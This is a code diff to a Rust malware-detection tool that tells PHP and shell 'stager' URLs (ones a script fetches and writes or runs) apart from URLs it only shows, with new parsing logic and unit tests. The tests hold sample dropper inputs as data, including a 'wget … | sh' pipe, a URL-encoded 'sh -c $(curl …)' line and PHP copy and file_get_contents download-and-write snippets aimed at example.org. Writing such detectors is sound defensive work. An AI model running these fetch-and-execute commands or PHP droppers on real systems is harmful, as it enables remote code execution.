@@ -90,6 +90,13 @@ static PHP_FETCH_RUN: LazyLock<Regex> = LazyLock::new(|| {
 /// The variable `copy` reads.
 static PHP_COPY_VAR: LazyLock<Regex> =
     LazyLock::new(|| regex(&format!(r"(?i-u){FUNCTION}copy\s*\(\s*\$([A-Za-z0-9_]+)")));
+/// The parameter list of a function, and a variable in it.
+static PHP_PARAMS: LazyLock<Regex> = LazyLock::new(|| {
+    regex(&format!(
+        r"(?i-u){FUNCTION}function\s+&?\s*[A-Za-z0-9_]+\s*\(([^)]*)\)"
+    ))
+});
+static PHP_VARIABLE: LazyLock<Regex> = LazyLock::new(|| regex(r"(?-u)\$([A-Za-z0-9_]+)"));
 /// A PHP-CGI option PHP loads and runs the file of.
 static PHP_CGI_LOAD: LazyLock<Regex> =
     LazyLock::new(|| regex(r"(?-u)(?:auto_prepend_file|auto_append_file)[ \t]*=[ \t]*"));
@@ -782,6 +789,10 @@ fn literal_use(text: &[u8], start: usize) -> Literal<'_> {
             }
         }
         Some(b',') if !shown => Literal::Argument,
+        // An array's value is read like a call's argument: `'a' => '…'`,
+        // or `['…'`, which `$a['…']` is not.
+        Some(b'>') if !shown && text[..at].ends_with(b"=>") => Literal::Argument,
+        Some(b'[') if !shown && !indexes(text, at - 1) => Literal::Argument,
         Some(b'=') if !shown => {
             // `$url = '…'`, not `href = '…'`, `==` or `=>`.
             let end = blank_back(text, at - 1);
@@ -797,6 +808,14 @@ fn literal_use(text: &[u8], start: usize) -> Literal<'_> {
         }
         _ => Literal::Other,
     }
+}
+
+/// Whether the `[` at `at` indexes what stands before it.
+fn indexes(text: &[u8], at: usize) -> bool {
+    let end = blank_back(text, at);
+    text[..end]
+        .last()
+        .is_some_and(|b| name_byte(b) || matches!(b, b']' | b')' | b'}'))
 }
 
 /// A URL match, without the punctuation a sentence or a call puts after it.
@@ -827,6 +846,16 @@ fn php_fetches(text: &[u8]) -> bool {
             );
             Regex::new(&pattern).is_ok_and(|r| r.is_match(text))
         }
+    })
+}
+
+/// Whether `copy` reads a function's parameter: it fetches and writes in one
+/// call, for whatever the function is given.
+fn copies_a_parameter(text: &[u8], copied: &HashSet<&[u8]>) -> bool {
+    PHP_PARAMS.captures_iter(text).any(|c| {
+        PHP_VARIABLE
+            .captures_iter(&c[1])
+            .any(|v| copied.contains(&v[1]))
     })
 }
 
@@ -938,18 +967,19 @@ impl Urls<'_> {
 
     /// A URL in PHP text that the script keeps: a whole string, handed to
     /// `include` or `copy`, or, in a layer that both fetches and writes or
-    /// runs what it fetches, an argument or a variable's value. Such a
-    /// script often takes the URL as an argument of its own function, so
-    /// the layer is read, not one call. Text it only shows joins nothing, as
+    /// runs what it fetches, an argument, an array's value or a variable's
+    /// value. Such a script often takes the URL as an argument of its own
+    /// function, so the layer is read, not one call. Text it only shows joins nothing, as
     /// a shared script's credit link would tie all its users together.
     fn php_saved(&self, xray: &Xray, layer: usize, found: &mut Found) {
         let text = &xray.layers[layer].text;
-        let keeps = PHP_FETCH_RUN.is_match(text) || (php_fetches(text) && PHP_WRITE.is_match(text));
         let copied: HashSet<&[u8]> = PHP_COPY_VAR
             .captures_iter(text)
             .filter_map(|c| c.get(1))
             .map(|m| m.as_bytes())
             .collect();
+        let writes = PHP_WRITE.is_match(text) || copies_a_parameter(text, &copied);
+        let keeps = PHP_FETCH_RUN.is_match(text) || (php_fetches(text) && writes);
         for (start, end) in php_literals(text) {
             let Some((0, len, url)) = urls_in(&text[start..end]).next() else {
                 continue;
@@ -1401,7 +1431,7 @@ mod tests {
             "href = \"https://example.org/\";",
             "location='https://example.org/';",
             "if ($a == 'https://example.org/') { }",
-            "$a = array('x' => 'https://example.org/');",
+            "$a['https://example.org/'] = 1;",
             "$a = 'see https://example.org/ for more';",
         ] {
             assert_eq!(shared_script(php), Role::Queried, "{php}");
@@ -1413,6 +1443,9 @@ mod tests {
         for php in [
             "drop('https://example.org/x');",
             "drop('a', 'https://example.org/x');",
+            "$a = array('x' => 'https://example.org/x');",
+            "$a = ['x' => 'https://example.org/x'];",
+            "$a = ['https://example.org/x'];",
             "$u = 'https://example.org/x'; curl_init($u);",
             "$this->u = 'https://example.org/x'; file_get_contents($this->u);",
             "define('SRC', 'https://example.org/x'); copy(SRC, 'a');",
@@ -1480,6 +1513,30 @@ mod tests {
     fn copy_of_another_file_keeps_nothing() {
         let x = post("<?php $u = 'http://example.org/s'; copy($a, $b); ?>");
         assert_eq!(one(&x, PieceKind::Stager).role, Role::Queried);
+        let x = post("<?php drop('http://example.org/s'); copy($a, $b); ?>");
+        assert_eq!(one(&x, PieceKind::Stager).role, Role::Queried);
+    }
+
+    #[test]
+    fn copy_of_a_function_parameter_keeps_its_argument() {
+        for php in [
+            "function drop($url, $to) { copy($url, $to); } drop('http://example.org/s', 'a');",
+            "function drop($a, $url = 'x') { copy($url, 'a'); } drop(1, 'http://example.org/s');",
+        ] {
+            let x = post(&format!("<?php {php} ?>"));
+            assert_eq!(one(&x, PieceKind::Stager).role, Role::Stager, "{php}");
+        }
+    }
+
+    #[test]
+    fn an_array_of_urls_needs_a_fetch_and_a_write() {
+        let x = post("<?php $a = array('x' => 'http://example.org/s'); ?>");
+        assert_eq!(one(&x, PieceKind::Stager).role, Role::Queried);
+        let x = post(
+            "<?php $a = ['x' => 'http://example.org/s']; \
+             foreach ($a as $k => $v) { file_put_contents($k, file_get_contents($v)); } ?>",
+        );
+        assert_eq!(one(&x, PieceKind::Stager).role, Role::Stager);
     }
 
     #[test]
@@ -1528,6 +1585,34 @@ mod tests {
             assert_eq!(x.layers.len(), 1, "{path}");
             assert_eq!(x.pieces, [], "{path}");
         }
+    }
+
+    #[test]
+    fn a_fetch_after_a_key_with_no_end_is_read() {
+        let x = post(
+            "-----BEGIN RSA PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA\n\
+             wget http://example.org/x -O- | sh\n",
+        );
+        assert_eq!(role_of(&x, "example.org"), Role::Stager);
+        let x = post(
+            "echo '-----BEGIN RSA PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA' > /tmp/k; \
+             chmod 600 /tmp/k; wget http://example.org/x -O- | sh",
+        );
+        assert_eq!(role_of(&x, "example.org"), Role::Stager);
+        for p in &x.pieces {
+            assert!(!format!("{p:?}").contains("b3Blbn"), "{p:?}");
+        }
+    }
+
+    /// The field that opens the text comes first, and is read first: the
+    /// other field holds the text and is read after it.
+    #[test]
+    fn a_fetch_open_as_a_later_field_is_saved_by_what_runs_it() {
+        let x = post(
+            "a=sh+-c+%22%24%28curl+-s+http%3A%2F%2Fexample.org%2Fx%29%22\
+             &b=curl+-s+http%3A%2F%2Fexample.org%2Fx",
+        );
+        assert_eq!(role_of(&x, "example.org"), Role::Stager);
     }
 
     #[test]
